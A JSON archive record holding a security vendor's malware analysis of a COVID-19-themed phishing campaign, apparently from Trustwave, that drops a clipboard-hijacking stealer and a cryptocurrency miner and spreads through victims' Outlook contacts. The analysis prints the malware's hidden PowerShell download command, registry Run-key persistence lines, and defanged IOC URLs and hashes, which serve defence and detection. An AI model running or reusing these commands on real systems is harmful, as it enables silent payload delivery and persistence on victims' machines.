{
    "id": "cafbf465-b21f-4f2c-8432-dc15a00aaa16",
    "created_at": "2023-01-12T15:07:19.743309Z",
    "updated_at": "2025-03-27T02:05:56.405959Z",
    "deleted_at": null,
    "sha1_hash": "1d903c2d97d862ccc502118826aeb7784ca663f4",
    "title": "2021-12-23 - COVID-19 Phishing Lure to Steal and Mine Cryptocurrency",
    "authors": "",
    "file_creation_date": "2022-05-28T19:48:02Z",
    "file_modification_date": "2022-05-28T19:48:02Z",
    "file_size": 435049,
    "plain_text": "# COVID-19 Phishing Lure to Steal and Mine Cryptocurrency\n\n**[trustwave.com/en-us/resources/blogs/spiderlabs-blog/covid-19-phishing-lure-to-steal-and-mine-cryptocurrency/](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/covid-19-phishing-lure-to-steal-and-mine-cryptocurrency/)**\n\nRecently, we observed a malware spam campaign leveraging the current COVID-19 situation. The emails\nwere sent from a compromised mailbox using a mailer script. The message contains a link leading to a\nWord document. The email takes advantage of a COVID-19 test mandate as a pretext to lure the\nunsuspecting user into clicking the link and downloading the document.\n\n_Figure 1. COVID-19_\n\n_themed malspam with link to the malicious document._\n\nThe initial downloaded Word document has no malicious code. But once the victim opens the Word\ndocument, it will try to retrieve a malicious macro-enabled template from a remote server. The technique is\n[known as Remote Template Injection and is commonly used to evade static detection After loading the](https://medium.com/@john.woodman11/vba-macro-remote-template-injection-with-unlinking-self-deletion-49aef5eec0cd)\n\n\n-----\n\nremote template, it will then prompt the user in enabling macro content.\n\n_snippet of the settings.xml.rels with template referenced to an external target._\n\n\n_Figure 2. Code_\n\n\n_Figure 3. Microsoft Word_\n\n_document lure to enable macro._\n\nThe template has Base64 binary files which are contained in the VBA UserForm. These binaries will be\ndecoded and dropped by the custom VBA functions in the template. The binaries that will be dropped are\nas follows:\n\n_%APPDATA%\\Microsoft\\Windows\\COM Surrogate\\dllhost.exe (ClipBanker)_\n_C:\\cfe91497d9137b2\\ffd0.exe (Coinminer downloader)_\n_%TEMP%\\instx.exe (Coinminer loader)_\n_C:\\cfe91497d9137b2\\COVID-19.docx (Injected Word document)_\n\n_Figure 4. VBA UserForm with embedded payloads._\n\n\n-----\n\n_Figure 5._\n\n_Infection chain_\n\nThe first binary dropped is an infostealer known as ClipBanker. This threat monitors the clipboard and\nreplaces cryptocurrency wallet addresses in the infected system with the threat actor’s own. The macro\nscript creates a registry startup key as a form of persistence.\n\n```\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\n```\n```\n[%random%5] = %AppData%\\Local\\Microsoft\\Windows\\COM Surrogate\\dllhost.exe\n\n```\n\nTo begin the mining process, the loader will start the downloader and it will then try to elevate the user\nprivilege. Next, the downloader fetches the main payload from a remote server, a coin miner and its\nconfiguration files. The coin miner will then be saved as “chrome.exe” to masquerade itself as a web\nbrowser.\n```\npowershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle\nHidden $ProgressPreference = ',27h,'SilentlyContinue',27h,'; Invoke-WebRequest\nhttps://github.com/octopus734/BitcoinLight/releases/download/BitcoinLight/BitcoinLight.dat\n-OutFile \"$env:appdata/Google` Chrome/chrome.exe\"\n\n```\nAlso, a registry startup key is added for the persistence of the coin miner.\n\n```\nREG ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n```\n```\n[%random%] = \"%AppData%\\Google Chrome\\chrome.exe\"\n\n```\n\nThe macro-enabled template also embedded a copy of the original Word document in the VBA UserForm.\nThe embedded Word document is dropped at C:/cfe91497d9137b2/COVID-19.docx.\n\nThe template can propagate itself beyond the infected system. This is done by hijacking the victim’s\nOutlook application via some macro VBA code, and harvesting the contact list.\n\n\n-----\n\n_Figure 6. Macro script looping through_\n\n_the victim’s inbox collecting sender names and email addresses._\n\nThe macro will then send an email to each of the victim’s contacts with a copy of the COVID-19 themed\ndocument as an attachment. With this method, sent emails are likely to be opened and documents\ndownloaded and executed by the recipients as they come from a trusted sender. Finally, the sent emails\nwill be deleted by the macro script in an attempt to cover its tracks and remove evidence.\n\n_Figure 7. Sending_\n\n_the malicious document to the list of harvested contacts._\n\n**Summary**\n\nAs we continue to deal with the threats of COVID-19-related malware with the resurgence of a new variant,\nthreat actors are taking advantage of the health scares and uncertainties to deliver malware, harvest\ncredentials, and ultimately, gain financially.\n\nThe [MailMarshal Secure Email Gateway has added protection for this threat for our customers. As usual,](https://www.trustwave.com/en-us/services/technology/secure-email-gateway/)\nwe advise all users to avoid clicking on URLs and attachments in unsolicited emails.\n\n**Indicators of Compromise (IOC)**\n\nLinks:\n\nhxxp[://]coronavirus-notice[.]com/COVID-19[.]docx\nhxxps[://]github[.]com/chocolate530/companytemplate/releases/download/generaltemplate/gentemplate[.]dotm\nhxxps[://]github[.]com/octopus734/BitcoinLight/releases/download/BitcoinLight/BitcoinLight[.]data\n\nFiles:\n\nCOVID-19.docx SHA1:94cd8f53b4022f9eeb41fb18ad6a62a746efebc7\ngentemplate.dotm SHA1:2d05a7b796afd354f201c4778eed14334f08d25e\ndllhost.exe SHA1:735209f627d7f7e17f13094f55f9d0056ad89bd1\ninstx.exe SHA1:fe9cadec56b3a68a54f19c5656702b35a4b97759\nffd0.exe SHA1:9fb38b5ca038e5253832471474415c80ae39cce3\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-23 - COVID-19 Phishing Lure to Steal and Mine Cryptocurrency.pdf"
    ],
    "report_names": [
        "2021-12-23 - COVID-19 Phishing Lure to Steal and Mine Cryptocurrency.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536039,
    "ts_updated_at": 1743041156,
    "ts_creation_date": 1653767282,
    "ts_modification_date": 1653767282,
    "files": {
        "pdf": "https://archive.orkl.eu/1d903c2d97d862ccc502118826aeb7784ca663f4.pdf",
        "text": "https://archive.orkl.eu/1d903c2d97d862ccc502118826aeb7784ca663f4.txt",
        "img": "https://archive.orkl.eu/1d903c2d97d862ccc502118826aeb7784ca663f4.jpg"
    }
}